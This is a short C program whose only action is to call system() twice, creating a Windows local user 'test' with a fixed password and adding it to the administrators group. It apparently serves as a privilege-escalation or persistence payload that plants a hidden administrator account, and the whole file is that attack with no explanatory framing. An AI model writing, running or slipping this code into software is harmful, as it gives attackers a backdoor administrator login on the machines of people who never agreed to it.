#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user test Password123! /add");
  i = system ("net localgroup administrators test /add");
  
  return 0;
}
